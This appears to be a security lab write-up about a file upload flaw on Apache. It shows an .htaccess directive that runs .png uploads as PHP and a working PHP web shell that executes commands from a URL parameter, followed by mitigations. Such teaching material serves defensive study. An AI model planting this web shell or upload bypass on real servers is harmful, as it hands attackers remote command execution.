## Overview

This lab demonstrates a **file upload vulnerability** in a simulated web application. By exploiting weak validation, we are able to achieve **Remote Code Execution (RCE)** on an Apache server using an `.htaccess` bypass technique.

---

## Objective

- Understand file upload vulnerabilities  
- Learn how `.htaccess` can be abused to execute uploaded files  
- Practice safe exploitation in a controlled environment  

---

## Vulnerability Description

File upload functionality is often a critical entry point for attackers. In this lab:

- The web application **fails to properly validate file types**  
- Apache `.htaccess` files are **not restricted**, allowing uploaded files to execute as PHP scripts  
- This allows attackers to execute arbitrary code on the server  

---

## Exploitation Steps

1. Prepare the exploit files:  
   - `exploit.php` ‚Äî the malicious PHP web shell  
   - `blank.png` ‚Äî a harmless-looking image file to bypass file type restrictions  
2. Upload `blank.png` to test the upload functionality  
3. Upload `exploit.php` disguised as an allowed file  
4. Upload an `.htaccess` file to enforce PHP execution on disguised uploads:  

```apache
AddType application/x-httpd-php .png
````

5. Access the uploaded `exploit.php` via the browser to execute commands

---

## Proof of Concept

**exploit.php**:

```php
<?php
// Simple PHP web shell example
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```

Test the exploit:

```
http://target.com/uploads/exploit.php?cmd=whoami
```

---

## Mitigation

* **Validate uploaded files**: restrict by MIME type and file extension
* **Rename uploaded files** and store outside web root
* **Disable `.htaccess` overrides** where not required
* **Use least privilege permissions** for upload directories
